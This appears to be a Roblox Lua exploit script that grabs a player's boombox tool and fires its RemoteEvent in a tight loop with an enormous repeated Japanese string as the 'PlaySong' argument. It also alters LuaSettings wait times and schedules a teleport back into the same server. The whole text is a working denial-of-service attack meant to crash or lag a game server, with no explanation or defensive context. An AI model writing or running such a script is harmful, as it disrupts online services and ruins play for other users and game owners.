local Error = ('お前はもう死んでいる'):rep(1600)

local Boombox = game:GetService('Players')['LocalPlayer'].Character:FindFirstChildOfClass('Tool')
local Remote = Boombox:FindFirstChildOfClass('RemoteEvent')

settings():GetService("LuaSettings").DefaultWaitTime = math.huge
for i=1, 15 do
    game:GetService("RunService").RenderStepped:wait()
end
settings():GetService("LuaSettings").DefaultWaitTime = -math.huge

spawn(function()
    wait(10)
    game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end)

repeat
  Remote:FireServer('PlaySong',Error)
  wait()
until not Boombox['Parent']:IsA('Model')
